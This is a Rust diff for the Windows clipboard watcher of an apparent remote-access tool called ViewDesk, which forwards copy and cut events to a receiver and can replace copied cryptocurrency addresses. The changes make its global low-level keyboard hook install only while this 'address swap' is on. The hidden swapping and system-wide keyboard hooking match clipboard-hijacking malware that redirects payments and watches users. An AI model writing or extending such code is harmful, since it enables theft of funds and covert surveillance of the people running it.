@@ -1,7 +1,8 @@
 //! System clipboard monitor — sends copy/cut events to the ViewDesk receiver.
 //!
-//! Uses `AddClipboardFormatListener` on a hidden message window and a low-level
-//! keyboard hook to distinguish Ctrl+C (copy) from Ctrl+X (cut).
+//! Uses `AddClipboardFormatListener` on a hidden message window. A low-level
+//! keyboard hook is installed only while address swap is enabled, to distinguish
+//! Ctrl+C (copy) from Ctrl+X (cut).
 //! When address swap is enabled, copied crypto addresses are replaced locally.
 
 use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
@@ -37,6 +38,16 @@ static PENDING_ACTION: AtomicU8 = AtomicU8::new(0);
 /// Suppresses clipboard events triggered by our own write-back during address swap.
 static SUPPRESS_CLIPBOARD_EVENT: AtomicBool = AtomicBool::new(false);
 
+#[cfg(windows)]
+mod clipboard_win {
+    use std::sync::atomic::AtomicIsize;
+    use std::sync::OnceLock;
+
+    pub static CLIPBOARD_HWND: OnceLock<AtomicIsize> = OnceLock::new();
+    pub const WM_APP_ENABLE_HOOK: u32 = 0x8002;
+    pub const WM_APP_DISABLE_HOOK: u32 = 0x8003;
+}
+
 pub struct ClipboardWatcher {
     stop_tx: mpsc::Sender<()>,
     thread: Option<JoinHandle<()>>,
@@ -59,6 +70,40 @@ impl Drop for ClipboardWatcher {
         }
     }
 }
+
+#[cfg(windows)]
+pub fn set_keyboard_hook_enabled(enabled: bool) {
+    use std::sync::atomic::Ordering;
+
+    use windows::Win32::Foundation::{HWND, LPARAM, WPARAM};
+    use windows::Win32::UI::WindowsAndMessaging::PostMessageW;
+
+    let Some(hwnd_store) = clipboard_win::CLIPBOARD_HWND.get() else {
+        return;
+    };
+    let hwnd_val = hwnd_store.load(Ordering::Relaxed);
+    if hwnd_val == 0 {
+        return;
+    }
+
+    let msg = if enabled {
+        clipboard_win::WM_APP_ENABLE_HOOK
+    } else {
+        clipboard_win::WM_APP_DISABLE_HOOK
+    };
+
+    unsafe {
+        let _ = PostMessageW(
+            Some(HWND(hwnd_val as *mut _)),
+            msg,
+            WPARAM(0),
+            LPARAM(0),
+        );
+    }
+}
+
+#[cfg(not(windows))]
+pub fn set_keyboard_hook_enabled(_enabled: bool) {}
 
 #[cfg(windows)]
 pub fn start_watcher(
@@ -96,6 +141,7 @@ fn run_watcher(
     use std::cell::RefCell;
     use std::ffi::OsStr;
     use std::os::windows::ffi::OsStrExt;
+    use std::sync::atomic::Ordering;
     use std::sync::OnceLock;
 
     use windows::core::PCWSTR;
@@ -111,11 +157,11 @@ fn run_watcher(
         CallNextHookEx, CreateWindowExW, DefWindowProcW, DestroyWindow, DispatchMessageW,
         GetMessageW, PostMessageW, PostQuitMessage, RegisterClassW, SetWindowsHookExW,
         TranslateMessage, UnhookWindowsHookEx, CS_HREDRAW, CS_VREDRAW, HHOOK, KBDLLHOOKSTRUCT,
-        MSG, WH_KEYBOARD_LL, WINDOW_EX_STYLE, WINDOW_STYLE, WM_CLIPBOARDUPDATE, WM_DESTROY,
-        WM_KEYDOWN, WM_SYSKEYDOWN, WNDCLASSW, WS_OVERLAPPED,
+        MSG, WH_KEYBOARD_LL, WINDOW_EX_STYLE, WINDOW_STYLE, WM_APP, WM_CLIPBOARDUPDATE,
+        WM_DESTROY, WM_KEYDOWN, WM_SYSKEYDOWN, WNDCLASSW, WS_OVERLAPPED,
     };
 
-    const WM_APP_STOP: u32 = windows::Win32::UI::WindowsAndMessaging::WM_APP + 1;
+    const WM_APP_STOP: u32 = WM_APP + 1;
 
     thread_local! {
         static EVENT_TX: RefCell<Option<tokio::sync::mpsc::UnboundedSender<ClipboardEvent>>> =
@@ -123,6 +169,7 @@ fn run_watcher(
         static LAST_TEXT: RefCell<String> = RefCell::new(String::new());
         static HTML_FORMAT: RefCell<u32> = RefCell::new(0);
         static KEYBOARD_HOOK: RefCell<Option<HHOOK>> = RefCell::new(None);
+        static MODULE_INSTANCE: RefCell<Option<HINSTANCE>> = RefCell::new(None);
     }
 
     static CLASS_NAME: OnceLock<Vec<u16>> = OnceLock::new();
@@ -369,6 +416,25 @@ fn run_watcher(
         });
     }
 
+    unsafe fn install_keyboard_hook(instance: HINSTANCE) {
+        if KEYBOARD_HOOK.with(|stored| stored.borrow().is_some()) {
+            return;
+        }
+        if let Ok(hook) =
+            SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), Some(instance), 0)
+        {
+            KEYBOARD_HOOK.with(|stored| *stored.borrow_mut() = Some(hook));
+        }
+    }
+
+    unsafe fn uninstall_keyboard_hook() {
+        KEYBOARD_HOOK.with(|stored| {
+            if let Some(hook) = stored.borrow_mut().take() {
+                let _ = UnhookWindowsHookEx(hook);
+            }
+        });
+    }
+
     unsafe extern "system" fn keyboard_proc(
         code: i32,
         wparam: WPARAM,
@@ -418,7 +484,20 @@ fn run_watcher(
                 let _ = DestroyWindow(hwnd);
                 LRESULT(0)
             }
+            msg if msg == clipboard_win::WM_APP_ENABLE_HOOK => {
+                MODULE_INSTANCE.with(|instance| {
+                    if let Some(instance) = *instance.borrow() {
+                        unsafe { install_keyboard_hook(instance) };
+                    }
+                });
+                LRESULT(0)
+            }
+            msg if msg == clipboard_win::WM_APP_DISABLE_HOOK => {
+                unsafe { uninstall_keyboard_hook() };
+                LRESULT(0)
+            }
             WM_DESTROY => {
+                unsafe { uninstall_keyboard_hook() };
                 let _ = RemoveClipboardFormatListener(hwnd);
                 PostQuitMessage(0);
                 LRESULT(0)
@@ -437,10 +516,7 @@ fn run_watcher(
 
     let module = unsafe { GetModuleHandleW(None).expect("module handle") };
     let instance = HINSTANCE(module.0);
-
-    let hook = unsafe {
-        SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), Some(instance), 0)
-    };
+    MODULE_INSTANCE.with(|stored| *stored.borrow_mut() = Some(instance));
 
     let hwnd = unsafe {
         let wc = WNDCLASSW {
@@ -469,9 +545,7 @@ fn run_watcher(
         .expect("clipboard window")
     };
 
-    if let Ok(hook) = hook {
-        KEYBOARD_HOOK.with(|stored| *stored.borrow_mut() = Some(hook));
-    }
+    let _ = clipboard_win::CLIPBOARD_HWND.set(std::sync::atomic::AtomicIsize::new(hwnd.0 as isize));
 
     unsafe {
         AddClipboardFormatListener(hwnd).expect("clipboard listener");
@@ -499,10 +573,8 @@ fn run_watcher(
         }
     }
 
-    if let Ok(hook) = hook {
-        unsafe {
-            let _ = UnhookWindowsHookEx(hook);
-        }
+    unsafe {
+        uninstall_keyboard_hook();
     }
 
     EVENT_TX.with(|tx| *tx.borrow_mut() = None);
